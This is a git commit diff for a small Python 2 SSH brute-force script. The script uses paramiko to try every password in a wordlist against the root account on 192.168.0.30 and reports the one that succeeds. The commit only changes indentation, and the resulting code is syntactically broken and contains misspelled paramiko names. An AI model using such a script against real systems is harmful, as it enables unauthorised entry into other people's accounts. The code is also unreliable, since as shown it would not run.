30d6c2dd87c036fb2c35f71999b97564f941838a
Anderson B Silva/ <32654298+oandersonbsilva@users.noreply.github.com>
2020-10-13 11:37:48 -0300

    Update bruteforce-ssh.py

--- bruteforce-ssh.py
+++ bruteforce-ssh.py
@@ -7,15 +7,17 @@ ssh.set_missing_host_key_policy(paramiko.AutoAddpolicy())
 
 f = open('lista.txt')
 for palavra in f.readlines():
-        senha = palavra.strip()
+    senha = palavra.strip()
 
-         try:
-                 ssh.connect('192.168.0.30', username='root', password=senha)
+    try:
+     ssh.connect('192.168.0.30', username='root', password=senha)
 
-             except paramiko.ssh_exception.AuthenticationExeption:
+    except paramiko.ssh_exception.AuthenticationExeption:
+    print "Testando com", senha
 
-                         print "Testando com", senha
-         else: 
-                         print "[+] A Senha foi Encontada ------->", senha 
-                         break
+    else: 
+    
+    print "[+] A Senha foi Encontada ------->", senha 
+        
+    break
 ssh.close()
